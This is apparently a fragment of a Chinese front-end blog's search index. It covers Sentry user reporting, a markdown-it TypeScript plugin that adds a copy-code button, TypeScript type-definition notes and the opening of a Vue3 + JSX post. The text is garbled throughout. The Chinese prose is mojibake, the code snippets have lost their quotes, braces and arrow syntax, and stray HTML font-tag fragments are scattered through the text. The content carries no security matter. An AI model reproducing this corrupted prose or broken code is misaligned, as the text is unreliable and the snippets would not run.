‡è¯†ï¼Œè¿™å¯¹æˆ‘ä»¬é’ˆå¯¹ç‰¹å®šç”¨æˆ·æ’æŸ¥æ—¥å¿—æ—¶ï¼Œä¸èƒ½è¯´æ¯«æ— å¸®åŠ©ï¼Œåªèƒ½è¯´èŠèƒœäºæ— ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸ŠæŠ¥ä¸€äº›ç‰¹å®šçš„å­—æ®µç”¨ä½œç”¨æˆ·çš„èº«ä»½æ ‡è¯†ï¼Œæ¯”å¦‚ usernameï¼Œemailï¼Œid ç­‰ç­‰ï¼š import * as Sentry from @sentry/vue;Sentry.init( // åˆå§‹åŒ–å‚æ•° ...);// è‡ªå®šä¹‰ç”¨æˆ·ä¿¡æ¯ï¼ŒsetUser çš„å…¥å‚ç±»å‹å¦‚ä¸‹ï¼š// export interface User // [key: string]: any;// id?: string;// ip_address?: string;// email?: string;// username?: string;// Sentry.setUser( id: xxx, username: xxx, email: xxx ); beforeï¼š afterï¼š æ€»ç»“sentry æ˜¯å‰ç«¯å¼‚å¸¸ç›‘æ§çš„ä¸äºŒé€‰æ‹©ï¼Œç”±äºå…¶æ˜¯å¼€æºé¡¹ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ç§æœ‰åŒ–éƒ¨ç½²ï¼Œè€Œ 9.1.2 ç‰ˆæœ¬å°±æ˜¯è€ƒè™‘åŠŸèƒ½æ€§å’Œéƒ¨ç½²æˆæœ¬çš„æœ€ä¼˜è§£ã€‚ å‚è€ƒ https://juejin.cn/post/7023537118454480904#heading-23 https://zhuanlan.zhihu.com/p/287941396"},{"title":"markdown-itï¼šæ·»åŠ ä»£ç å¤åˆ¶åŠŸèƒ½","path":"/2023/09/01/d24e5effb3b7/","content":"markdown-it æ¸²æŸ“å‡ºæ¥çš„ä»£ç å—å¦‚ä¸‹é¢å·¦å›¾ä¸€æ ·ï¼Œå…‰ç§ƒç§ƒçš„ä¸€å—ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•äº¤äº’åŠŸèƒ½ï¼Œç°åœ¨æˆ‘ä»¬æ¥ç¾åŒ–ä¸€ä¸‹ï¼Œæ·»åŠ ä¸€ä¸ª copy ä»£ç çš„æŒ‰é’®ï¼Œå°†ä»£ç å—çš„è¯­è¨€ä¹Ÿä¸€å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚ å¼€å‘æ’ä»¶è¦å®ç°ä¸Šé¢çš„åŠŸèƒ½ï¼Œå…‰ç”¨ CSS æ¥åšæ˜¯ä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ© markdown-it çš„æ’ä»¶æœºåˆ¶ï¼Œç”¨æ’ä»¶å®ç°ä¸Šé¢çš„åŠŸèƒ½ã€‚ æˆ‘ä»¬çš„æ’ä»¶ç”¨ TypeScript å¼€å‘ï¼Œæ‰€ä»¥å…ˆå®‰è£… markdown-it çš„ç±»å‹æ–‡ä»¶ï¼Œè·å–ç±»å‹è¯´æ˜ pnpm add @types/markdown-it -D æ·»åŠ ä¸€ä¸ªæ’ä»¶æ¨¡æ¿ import type MarkdownIt from markdown-it;export default (md: MarkdownIt) = # .....; å®ç°åŠŸèƒ½ï¼ˆç”±äºæ’ä»¶æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œä¸å¤šåšè§£é‡Šï¼Œç›´æ¥çœ‹æ³¨é‡Šå°±è¡Œï¼‰ import type MarkdownIt from markdown-it;import type Renderer from markdown-it/lib/renderer;import ClipboardJS from clipboard;import escape from lodash-es;const clipboard = new ClipboardJS(.markdown-it-code-copy);// æœª copy æ—¶æŒ‰é’®çš„ innerHTMLconst copyInnerHTML = ` svg aria-hidden=true focusable=false role=img class=octicon octicon-copy viewBox=0 0 16 16 width=12 height=12 fill=currentColor style=display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;path d=M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z/pathpath d=M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z/path/svg spanCopy/span`;// copy åæŒ‰é’®çš„ innerHTMLconst copiedInnerHTML = ` svg aria-hidden=true focusable=false role=img class=octicon octicon-check viewBox=0 0 16 16 width=12 height=12 fill=currentColor style=display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;path d=M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z/path/svg spanCopied!/span`;clipboard.on(success, (e) = const trigger = e.trigger; e.clearSelection(); trigger.innerHTML = copiedInnerHTML; setTimeout(() = trigger.innerHTML = copyInnerHTML; , 3000););// ç”¨æ­£åˆ™æå–å‡º code çš„è¯­è¨€const getCodeLangFragment = (htmlString: string) = const regex = /code class=hljs (language-([a-z]+))/; const match = htmlString.match(regex); return match?.[2] || ;;const renderCode = (renderer: Renderer.RenderRule): Renderer.RenderRule = return (...args) = const [tokens, idx] = args; const content = escape(tokens[idx].content); const origRendered = renderer.apply(this, args); if (content.length === 0) return origRendered; const lang = getCodeLangFragment(origRendered); return ` div class=code-enhance div class=code-enhance-header span$lang/span span class=markdown-it-code-copy code-enhance-copy data-clipboard-text=$content $copyInnerHTML /span /div div class=code-enhance-content $origRendered /div /div `; ;;/** * markdown-it çš„æ’ä»¶ï¼Œæ·»åŠ ä»£ç è¯­è¨€æ˜¾ç¤ºå’Œ copy ä»£ç æŒ‰é’® */export default (md: MarkdownIt) = if (md.renderer.rules.code_block != null) md.renderer.rules.code_block = renderCode(md.renderer.rules.code_block); if (md.renderer.rules.fence != null) md.renderer.rules.fence = renderCode(md.renderer.rules.fence); ; æ·»åŠ æ ·å¼.code-enhance display: flex; flex-direction: column; border-radius: 7px; overflow: hidden; margin-top: 10px; -header background-color: #e2e6ea; height: 32px; box-sizing: border-box; padding: 0 16px; font-size: 12px; display: flex; justify-content: space-between; align-items: center; gap: 8px; -content background-color: #fff; padding: 1em; pre margin: 0; code padding: 0 !important; -copy font-size: 12px; display: inline-flex; align-items: center; cursor: pointer; gap: 6px; line-height: 1.5; å®‰è£…æ’ä»¶import markdownIt from markdown-it;import markdownItCodeCopy from ./markdown-it-code-copy;const md = markdownIt().use(markdownItCodeCopy);"},{"title":"TypeScript ä»å…¥é—¨åˆ°å…¥åœŸ - ç±»å‹å®šä¹‰","path":"/2023/08/29/7252827e19c3/","content":"ğŸ’¡ å…¥é—¨æ•™ç¨‹æ¨èï¼š[https://ts.xcatliu.com/](https://ts.xcatliu.com/) æœ¬æ–‡ä¸æ˜¯ TS çš„å…¥é—¨æ•™ç¨‹ï¼Œå¯ä»¥çœ‹æˆæ˜¯ ã€ŠTypeScript å…¥é—¨æ•™ç¨‹ã€‹çš„è¯»ä¹¦ç¬”è®°ï¼Œåœ¨åé¢ä½¿ç”¨ TS çš„è¿‡ç¨‹ä¸­ï¼Œæƒ³ä¸èµ·æ¥æ€ä¹ˆç”¨æ—¶ï¼Œå¯ä»¥ç”¨æ¥æŸ¥è¯¢å’Œç¿»é˜…çš„å·¥å…·ã€‚ åŸå§‹æ•°æ®ç±»å‹JS ä¸­åŒ…å«çš„åŸå§‹æ•°æ®ç±»å‹æœ‰ï¼šå¸ƒå°”å€¼ã€æ•°å€¼ã€å­—ç¬¦ä¸²ã€nullã€undefined ä»¥åŠ ES6 ä¸­çš„æ–°ç±»å‹ Symbol å’Œ ES10 ä¸­çš„æ–°ç±»å‹ BigIntã€‚ ä¸‹é¢ä»‹ç»ä¸‹è¿™äº›åŸå§‹æ•°æ®ç±»å‹åœ¨ TS ä¸­çš„åº”ç”¨ï¼š // å¸ƒå°”å€¼const isDone: boolean = false;// æ•°å€¼const decLiteral: number = 6;// å­—ç¬¦ä¸²const myName: string = Tom;// Null å’Œ Undefinedconst u: undefined = undefined;const n: null = null;// Symbolconst s: symbol = Symbol(a);// BigIntconst b: bigint = BigInt(10);```/divcolor3æ³¨æ„ï¼šä¸Šé¢çš„ç”¨æ³•æ˜¯ä¸ªé”™è¯¯âŒä¾‹å­ï¼Œåªæ˜¯ä¸ºäº†è¯´æ˜æ€ä¹ˆæ˜¾ç¤ºçš„å®šä¹‰ç±»å‹è€Œä½œçš„è¯´æ˜ï¼Œåœ¨çœŸå®çš„é¡¹ç›®ä¸­ä¸è¦è¿™ä¹ˆä½¿ç”¨ã€‚/divåŸå› æ˜¯ font style=color:rgb(24, 32, 38);TypeScript èƒ½å¤Ÿæ ¹æ®å‚æ•°ã€å±æ€§å’Œå˜é‡çš„é»˜è®¤å€¼æˆ–åˆå§‹å€¼æ¨æ–­å…¶ç±»å‹ã€‚æ— éœ€æ˜¾ç¤ºçš„æ³¨é‡Šå…¶ç±»å‹ã€‚è¿™æ ·åšä¼šç»™ä»£ç å¢åŠ ä¸å¿…è¦çš„å†—é•¿ï¼Œä½¿å…¶æ›´éš¾ä»¥é˜…è¯»ï¼Œå¹¶ä¸”åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½ä¼šé˜»æ­¢ TypeScript æ¨æ–­æ›´å…·ä½“çš„ç±»å‹ã€‚/fontfont style=color:rgb(24, 32, 38);/fontfont style=color:rgb(24, 32, 38);ä¾‹å¦‚ï¼š/font**font style=color:rgb(24, 32, 38);const isDone = false/font**font style=color:rgb(24, 32, 38); çš„ç±»å‹ä¼šè‡ªåŠ¨æ¨æ–­ä¸º /font**font style=color:rgb(24, 32, 38);false/font**font style=color:rgb(24, 32, 38);ï¼Œ/font**font style=color:rgb(24, 32, 38);let isDone = false/font**font style=color:rgb(24, 32, 38); çš„ç±»å‹æ‰ä¼šæ¨æ–­ä¸º /font**font style=color:rgb(24, 32, 38);boolean/font**font style=color:rgb(24, 32, 38);ï¼Œå› æ­¤å¦‚æœç»™ const å®šä¹‰çš„ isDone æ˜¾ç¤ºçš„æ³¨é‡Šå…¶ç±»å‹ä¸º boolean çš„åŒ–ï¼Œä¼šæ‰©å¤§å®ƒçš„ç±»å‹èŒƒå›´ï¼Œå¸¦æ¥ä¸€äº›ä¸å¿…è¦çš„é£é™©ã€‚/fontfont style=color:rgb(24, 32, 38);/fontfont style=color:rgb(24, 32, 38);å› æ­¤åªå»ºè®®åœ¨å®šä¹‰ä¸€ä¸ªå˜é‡æ²¡æœ‰åˆå§‹å€¼çš„æƒ…å†µä¸‹æ˜¾ç¤ºçš„å®šä¹‰å…¶ç±»å‹ï¼ˆ/fontfont style=color:#ED740C;è€Œä¸”ä¹Ÿæ˜¯å¿…é¡»çš„/fontfont style=color:rgb(24, 32, 38);ï¼‰ï¼š/font/divcolor3font style=color:rgb(51, 51, 51);å¦‚æœå®šä¹‰çš„æ—¶å€™æ²¡æœ‰èµ‹å€¼æˆ–è€…æŒ‡å®šç±»å‹ï¼Œä¸ç®¡ä¹‹åæœ‰æ²¡æœ‰èµ‹å€¼ï¼Œéƒ½ä¼šè¢«æ¨æ–­æˆ any ç±»å‹è€Œå®Œå…¨ä¸è¢«ç±»å‹æ£€æŸ¥/font/div```typescriptlet myFavoriteNumber; // myFavoriteNumber çš„ç±»å‹å°±æ˜¯ any äº†ï¼Œä¹‹åå¯ä»¥è¢«ä»»ä½•ç±»å‹çš„å˜é‡èµ‹å€¼myFavoriteNumber = seven;myFavoriteNumber = 7; åœ¨å®šä¹‰å˜é‡æ²¡æœ‰é»˜è®¤å€¼çš„æƒ…å†µä¸‹ï¼Œå¿…é¡»æŒ‡å®šå…¶ç±»å‹ // å¸ƒå°”å€¼let isDone: boolean;// æ•°å€¼let decLiteral: number;// å­—ç¬¦ä¸²let myName: string;// Null å’Œ Undefinedlet u: undefined;let n: null;// Symbollet s: symbol;// BigIntlet b: bigint; æ³¨æ„ï¼ŒTypeScript ä¸­ä½¿ç”¨å­—é¢é‡å’Œæ„é€ å‡½æ•°å®šä¹‰çš„å˜é‡çš„ç±»å‹æ˜¯ä¸ä¸€æ ·çš„ï¼š let bool1: boolean = false;let bool2: Boolean = new Boolean(0); å…¶ä»–çš„åŸºæœ¬ç±»å‹éƒ½æ˜¯ä¸€æ ·ï¼Œä¸å†èµ˜è¿°ã€‚ void å’Œ neverJavascript ä¸­æ²¡æœ‰ void å’Œ never çš„æ¦‚å¿µã€‚åœ¨ TypeScript ä¸­ï¼Œå…¶ä½œç”¨å¦‚ä¸‹ï¼š voidè¡¨ç¤ºæ²¡æœ‰ä»»ä½•è¿”å›å€¼çš„å‡½æ•° neverè¡¨ç¤ºé‚£äº›æ°¸è¿œä¸å­˜çš„å€¼çš„ç±»å‹ï¼Œä¾‹å¦‚é‚£äº›æ€»æ˜¯ä¼šæŠ›å‡ºå¼‚å¸¸æˆ–æ ¹æœ¬å°±ä¸ä¼šæœ‰è¿”å›å€¼çš„å‡½æ•° void åº”ç”¨åœºæ™¯ï¼š function alertName(): void alert(My name is Tom); å£°æ˜ä¸€ä¸ª void ç±»å‹çš„å˜é‡æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œå› ä¸ºä½ åªèƒ½å°†å®ƒèµ‹å€¼ä¸º undefined å’Œ nullï¼ˆåªåœ¨ â€“strictNullChecks æœªæŒ‡å®šæ—¶ï¼‰ let unusable: void = undefined; never åº”ç”¨åœºæ™¯ï¼š // è¿”å›neverçš„å‡½æ•°å¿…é¡»å­˜åœ¨æ— æ³•è¾¾åˆ°çš„ç»ˆç‚¹function error(message: string): never throw new Error(message);// æ¨æ–­çš„è¿”å›å€¼ç±»å‹ä¸ºneverfunction fail() return error(Something failed);// è¿”å›neverçš„å‡½æ•°å¿…é¡»å­˜åœ¨æ— æ³•è¾¾åˆ°çš„ç»ˆç‚¹function infiniteLoop(): never while (true) never ç±»å‹æ˜¯ä»»ä½•ç±»å‹çš„å­ç±»å‹ï¼Œä¹Ÿå¯ä»¥èµ‹å€¼ç»™ä»»ä½•ç±»å‹ï¼›ç„¶è€Œï¼Œæ²¡æœ‰ç±»å‹æ˜¯ never çš„å­ç±»å‹æˆ–å¯ä»¥èµ‹å€¼ç»™ never ç±»å‹ï¼ˆé™¤äº† never æœ¬èº«ä¹‹å¤–ï¼‰ã€‚ å³ä½¿ any ä¹Ÿä¸å¯ä»¥èµ‹å€¼ç»™ neverã€‚ å¯¹è±¡ç±»å‹ä½¿ç”¨ interface å®šä¹‰å¯¹è±¡çš„ç±»å‹ï¼š interface Person name: string; age: number;let tom: Person = name: Tom, age: 25,; ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œtom çš„å½¢çŠ¶å’Œæ¥å£ Person å¿…é¡»ä¸€è‡´ï¼Œå¯¹è±¡çš„å…ƒç´ ä¸å…è®¸å¤šä¹Ÿä¸å…è®¸å°‘ï¼Œèµ‹å€¼çš„æ—¶å€™å˜é‡çš„å½¢çŠ¶å¿…é¡»å’Œæ¥å£çš„å½¢çŠ¶ä¿æŒä¸€è‡´ã€‚ å¦‚ä½•å°‘ä¸€äº›å­—æ®µï¼š ä½¿ç”¨å¯é€‰å±æ€§ ?:ï¼Œä½†æ˜¯ä¾æ—§ä¸å…è®¸æ·»åŠ æœªå®šä¹‰çš„å±æ€§ï¼š interface Person name: string; age?: number;let tom: Person = name: Tom,;let tom1: Person = name: Tom, age: 25, gender: male,;// examples/playground/index.ts(9,5): error TS2322: Type name: string; age: number; gender: string; is not assignable to type Person.// Object literal may only specify known properties, and gender does not exist in type Person. å¦‚ä½•å¤šä¸€äº›å­—æ®µï¼š å¯ä»¥å®šä¹‰ä¸€ä¸ªä»»æ„å±æ€§ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€ä¸ªæ¥å£åªèƒ½å®šä¹‰ä¸€ä¸ªä»»æ„å±æ€§ï¼š interface Person name: string; age?: number; [propName: string]: string;let tom: Person = name: Tom, gender: male,;let tom1: Person = name: Tom, age: 25, gender: male,;// index.ts(3,5): error TS2411: Property age of type number is not assignable to string index type string.// index.ts(7,5): error TS2322: Type [x: string]: string | number; name: string; age: number; gender: string; is not assignable to type Person.// Index signatures are incompatible.// Type string | number is not assignable to type string.// Type number is not assignable to type string. æ³¨æ„ï¼šä¸€æ—¦å®šä¹‰äº†ä»»æ„å±æ€§ï¼Œé‚£ä¹ˆç¡®å®šå±æ€§å’Œå¯é€‰å±æ€§çš„ç±»å‹éƒ½å¿…é¡»æ˜¯å®ƒçš„ç±»å‹çš„å­é›†ï¼Œä¸Šä¾‹ä¸­ï¼Œä»»æ„å±æ€§çš„å€¼å…è®¸æ˜¯ stringï¼Œä½†æ˜¯å¯é€‰å±æ€§ age çš„å€¼å´æ˜¯ numberï¼Œnumber ä¸æ˜¯ string çš„å­å±æ€§ï¼Œæ‰€ä»¥æŠ¥é”™äº†ã€‚ å±æ€§åªè¯»ï¼š ä½¿ç”¨ readonly å®šä¹‰çš„åªè¯»å±æ€§åªèƒ½åœ¨åˆ›å»ºçš„æ˜¯å¦è¢«èµ‹å€¼ï¼š interface Person readonly id: number; name: string; age?: number; [propName: string]: any;let tom: Person = id: 89757, name: Tom, gender: male,;tom.id = 9527;// index.ts(14,5): error TS2540: Cannot assign to id because it is a constant or a read-only property. æ³¨æ„ï¼Œåªè¯»çš„çº¦æŸå­˜åœ¨äºç¬¬ä¸€æ¬¡ç»™å¯¹è±¡èµ‹å€¼çš„æ—¶å€™ï¼Œè€Œä¸æ˜¯ç¬¬ä¸€æ¬¡ç»™åªè¯»å±æ€§èµ‹å€¼çš„æ—¶å€™ æ•°ç»„ç±»å‹åœ¨ TypeScript ä¸­ï¼Œå®šä¹‰æ•°ç»„ç±»å‹çš„æ–¹å¼æœ‰å¤šç§ï¼Œæ¯”è¾ƒçµæ´»ã€‚ // ã€Œç±»å‹ + æ–¹æ‹¬å·ã€è¡¨ç¤ºæ³•let fibonacci: number[] = [1, 1, 2, 3, 5];// æ•°ç»„æ³›å‹let fibonacci: Arraynumber = [1, 1, 2, 3, 5];// æ¥å£interface NumberArray [index: number]: number;let fibonacci: NumberArray = [1, 1, 2, 3, 5]; å‡½æ•°ç±»å‹åœ¨ JavaScript ä¸­ï¼Œæœ‰ä¸¤ç§å¸¸è§çš„å®šä¹‰å‡½æ•°çš„æ–¹å¼ - å‡½æ•°å£°æ˜å’Œå‡½æ•°è¡¨è¾¾å¼ï¼š å‡½æ•°å‡½æ•°å£°æ˜ï¼š // å‡½æ•°å£°æ˜function sum(x, y) return x + y;// æ·»åŠ ç±»å‹å®šä¹‰function sum(x: number, y: number): number return x + y; å‡½æ•°è¡¨è¾¾å¼ï¼š // å‡½æ•°è¡¨è¾¾å¼let mySum = function (x, y) return x + y;;// æ·»åŠ ç±»å‹å®šä¹‰let mySum = function (x: number, y: number): number return x + y;;// ä¸Šé¢ mySum çš„ç±»å‹æ˜¯æ ¹æ® = çš„å³ä¾§æ¨æ–­å‡ºæ¥çš„ï¼Œå¦‚æœéœ€è¦æ˜¾ç¤ºçš„æŒ‡å®šå…¶ç±»å‹let mySum: (x: number, y: number) = number = function ( x: number, y: number): number return x + y;;// å¯ä»¥ä½¿ç”¨æ¥å£æ¥å®šä¹‰å‡½æ•°çš„ç±»å‹interface SearchFunc (source: string, subString: string): boolean;let mySearch: SearchFunc = function (source: string, subString: string) return source.search(subString) !== -1;; å‚æ•°å¯é€‰ï¼š ä¸æ¥å£ä¸­çš„å¯é€‰å±æ€§ç±»ä¼¼ï¼Œæˆ‘ä»¬ç”¨ ? è¡¨ç¤ºå¯é€‰çš„å‚æ•°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šå¯é€‰å‚æ•°åé¢ä¸å…è®¸å†å‡ºç°å¿…éœ€å‚æ•°äº† function buildName(firstName: string, lastName?: string) if (lastName) return firstName + + lastName; else return firstName; let tomcat = buildName(Tom, Cat);let tom = buildName(Tom); å‚æ•°é»˜è®¤å€¼ï¼š åœ¨ ES6 ä¸­ï¼Œæˆ‘ä»¬å…è®¸ç»™å‡½æ•°çš„å‚æ•°æ·»åŠ é»˜è®¤å€¼ï¼ŒTypeScript ä¼šå°†æ·»åŠ äº†é»˜è®¤å€¼çš„å‚æ•°è¯†åˆ«ä¸ºå¯é€‰å‚æ•°ï¼š function buildName(firstName: string, lastName: string = Cat) return firstName + + lastName;let tomcat = buildName(Tom, Cat);let tom = buildName(Tom); æ­¤æ—¶å°±ä¸å—ã€Œå¯é€‰å‚æ•°å¿…é¡»æ¥åœ¨å¿…éœ€å‚æ•°åé¢ã€çš„é™åˆ¶äº†ï¼š function buildName(firstName: string = Tom, lastName: string) return firstName + + lastName;let tomcat = buildName(Tom, Cat);let cat = buildName(undefined, Cat); å‰©ä½™å‚æ•°ï¼š ES6 ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ font style=color:rgb(51, 51, 51);...rest/font çš„æ–¹å¼è·å–å‡½æ•°ä¸­çš„å‰©ä½™å‚æ•°ï¼ˆrest å‚æ•°ï¼‰ï¼š function push(array, ...items) items.forEach(function (item) array.push(item); );let a: any[] = [];push(a, 1, 2, 3); äº‹å®ä¸Šï¼Œfont style=color:rgb(51, 51, 51);items /fontæ˜¯ä¸€ä¸ªæ•°ç»„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„çš„ç±»å‹æ¥å®šä¹‰å®ƒï¼š function push(array: any[], ...items: any[]) items.forEach(function (item) array.push(item); );let a = [];push(a, 1, 2, 3); å‡½æ•°é‡è½½ï¼š é‡è½½å…è®¸ä¸€ä¸ªå‡½æ•°æ¥å—ä¸åŒæ•°é‡æˆ–ç±»å‹çš„å‚æ•°æ—¶ï¼Œä½œå‡ºä¸åŒçš„å¤„ç†ã€‚ æ¯”å¦‚ï¼Œæˆ‘ä»¬éœ€è¦å®ç°ä¸€ä¸ªå‡½æ•° reverseï¼Œè¾“å…¥æ•°å­— 123 çš„æ—¶å€™ï¼Œè¾“å‡ºåè½¬çš„æ•°å­— 321ï¼Œè¾“å…¥å­—ç¬¦ä¸² â€˜helloâ€™ çš„æ—¶å€™ï¼Œè¾“å‡ºåè½¬çš„å­—ç¬¦ä¸² â€˜ollehâ€™ã€‚ åˆ©ç”¨è”åˆç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆå®ç°ï¼š function reverse(x: number | string): number | string | void if (typeof x === number) return Number(x.toString().split().reverse().join()); else if (typeof x === string) return x.split().reverse().join(); ç„¶è€Œè¿™æ ·æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯ä¸èƒ½å¤Ÿç²¾ç¡®çš„è¡¨è¾¾ï¼Œè¾“å…¥ä¸ºæ•°å­—çš„æ—¶å€™ï¼Œè¾“å‡ºä¹Ÿåº”è¯¥ä¸ºæ•°å­—ï¼Œè¾“å…¥ä¸ºå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¾“å‡ºä¹Ÿåº”è¯¥ä¸ºå­—ç¬¦ä¸²ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨é‡è½½å®šä¹‰å¤šä¸ª reverse çš„å‡½æ•°ç±»å‹ï¼š function reverse(x: number): number;function reverse(x: string): string;function reverse(x: number | string): number | string | void if (typeof x === number) return Number(x.toString().split().reverse().join()); else if (typeof x === string) return x.split().reverse().join(); ä¸Šä¾‹ä¸­ï¼Œæˆ‘ä»¬é‡å¤å®šä¹‰äº†å¤šæ¬¡å‡½æ•° reverseï¼Œå‰å‡ æ¬¡éƒ½æ˜¯å‡½æ•°å®šä¹‰ï¼Œæœ€åä¸€æ¬¡æ˜¯å‡½æ•°å®ç°ã€‚åœ¨ç¼–è¾‘å™¨çš„ä»£ç æç¤ºä¸­ï¼Œå¯ä»¥æ­£ç¡®çš„çœ‹åˆ°å‰ä¸¤ä¸ªæç¤ºã€‚ æ³¨æ„ï¼ŒTypeScript ä¼šä¼˜å…ˆä»æœ€å‰é¢çš„å‡½æ•°å®šä¹‰å¼€å§‹åŒ¹é…ï¼Œæ‰€ä»¥å¤šä¸ªå‡½æ•°å®šä¹‰å¦‚æœæœ‰åŒ…å«å…³ç³»ï¼Œéœ€è¦ä¼˜å…ˆæŠŠç²¾ç¡®çš„å®šä¹‰å†™åœ¨å‰é¢ã€‚ ç±»ç±»å‹ä¸‹é¢çœ‹ä¸€ä¸ªä½¿ç”¨ç±»çš„ä¾‹å­ï¼š class Greeter greeting: string; constructor(message: string) this.greeting = message; greet() return Hello, + this.greeting; let greeter = new Greeter(world); ç»§æ‰¿ï¼š class Animal name: string; constructor(theName: string) this.name = theName; move(distanceInMeters: number = 0) console.log(`$this.name moved $distanceInMetersm.`); class Snake extends Animal constructor(name: string) super(name); move(distanceInMeters = 5) console.log(Slithering...); super.move(distanceInMeters); class Horse extends Animal constructor(name: string) super(name); move(distanceInMeters = 45) console.log(Galloping...); super.move(distanceInMeters); let sam = new Snake(Sammy the Python);let tom: Animal = new Horse(Tommy the Palomino);sam.move();tom.move(34); å…¬å…±ï¼Œç§æœ‰ä¸å—ä¿æŠ¤çš„ä¿®é¥°ç¬¦ï¼š publicï¼šé»˜è®¤çš„ä¿®é¥°ç¬¦ï¼Œå…è®¸åœ¨ç±»çš„å¤–éƒ¨å’Œæ´¾ç”Ÿç±»è®¿é—® privateï¼šä¸å…è®¸åœ¨å£°æ˜å®ƒçš„ç±»çš„å¤–éƒ¨è®¿é—® protectedï¼šå…è®¸åœ¨æ´¾ç”Ÿç±»ä¸­è®¿é—® class Person protected name: string; constructor(name: string) this.name = name; class Employee extends Person private department: string; constructor(name: string, department: string) super(name); this.department = department; public getElevatorPitch() return `Hello, my name is $this.name and I work in $this.department.`; let howard = new Employee(Howard, Sales);console.log(howard.getElevatorPitch());console.log(howard.name); // é”™è¯¯ **å±æ€§åªè¯»ï¼š**ä½ å¯ä»¥ä½¿ç”¨ readonly å…³é”®å­—å°†å±æ€§è®¾ç½®ä¸ºåªè¯»çš„ã€‚ åªè¯»å±æ€§å¿…é¡»åœ¨å£°æ˜æ—¶æˆ–æ„é€ å‡½æ•°é‡Œè¢«åˆå§‹åŒ–ã€‚ class Octopus readonly name: string; readonly numberOfLegs: number = 8; constructor(theName: string) this.name = theName; let dad = new Octopus(Man with the 8 strong legs);dad.name = Man with the 3-piece suit; // é”™è¯¯! name æ˜¯åªè¯»çš„. é™æ€å±æ€§ï¼š class Grid static origin = x: 0, y: 0 ; calculateDistanceFromOrigin(point: x: number; y: number ) let xDist = point.x - Grid.origin.x; let yDist = point.y - Grid.origin.y; return Math.sqrt(xDist * xDist + yDist * yDist) / this.scale; constructor(public scale: number) let grid1 = new Grid(1.0); // 1x scalelet grid2 = new Grid(5.0); // 5x scaleconsole.log(grid1.calculateDistanceFromOrigin( x: 10, y: 10 ));console.log(grid2.calculateDistanceFromOrigin( x: 10, y: 10 )); æŠ½è±¡ç±»ï¼š æŠ½è±¡ç±»çš„ç‰¹æ€§å¦‚ä¸‹ï¼š æŠ½è±¡ç±»åšä¸ºå…¶å®ƒæ´¾ç”Ÿç±»çš„åŸºç±»ä½¿ç”¨ã€‚ å®ƒä»¬ä¸€èˆ¬ä¸ä¼šç›´æ¥è¢«å®ä¾‹åŒ– æŠ½è±¡ç±»å¯ä»¥åŒ…å«æˆå‘˜çš„å®ç°ç»†èŠ‚ abstract å…³é”®å­—æ˜¯ç”¨äºå®šä¹‰æŠ½è±¡ç±»å’Œåœ¨æŠ½è±¡ç±»å†…éƒ¨å®šä¹‰æŠ½è±¡æ–¹æ³• æŠ½è±¡ç±»ä¸­çš„æŠ½è±¡æ–¹æ³•ä¸åŒ…å«å…·ä½“å®ç°å¹¶ä¸”å¿…é¡»åœ¨æ´¾ç”Ÿç±»ä¸­å®ç° abstract class Department constructor(public name: string) printName(): void console.log(Department name: + this.name); abstract printMeeting(): void; // å¿…é¡»åœ¨æ´¾ç”Ÿç±»ä¸­å®ç°class AccountingDepartment extends Department constructor() super(Accounting and Auditing); // åœ¨æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°ä¸­å¿…é¡»è°ƒç”¨ super() printMeeting(): void console.log(The Accounting Department meets each Monday at 10am.); generateReports(): void console.log(Generating accounting reports...); let department: Department; // å…è®¸åˆ›å»ºä¸€ä¸ªå¯¹æŠ½è±¡ç±»å‹çš„å¼•ç”¨department = new Department(); // é”™è¯¯: ä¸èƒ½åˆ›å»ºä¸€ä¸ªæŠ½è±¡ç±»çš„å®ä¾‹department = new AccountingDepartment(); // å…è®¸å¯¹ä¸€ä¸ªæŠ½è±¡å­ç±»è¿›è¡Œå®ä¾‹åŒ–å’Œèµ‹å€¼department.printName();department.printMeeting();department.generateReports(); // é”™è¯¯: æ–¹æ³•åœ¨å£°æ˜çš„æŠ½è±¡ç±»ä¸­ä¸å­˜åœ¨ ****"},{"title":"Vue3 + JSX + Typescript ä½¿ç”¨æ‰‹å†Œ","path":"/2023/07/31/096fe8cfde27/","content":"èƒŒæ™¯çŸ¥è¯†å¯¹æ ‡é¢˜æåˆ°çš„çŸ¥è¯†ä¸ç†Ÿæ‚‰çš„ï¼Œè¿™é‡Œæ¨èå‡ ä¸ªå­¦ä¹ çš„åœ°æ–¹ï¼š 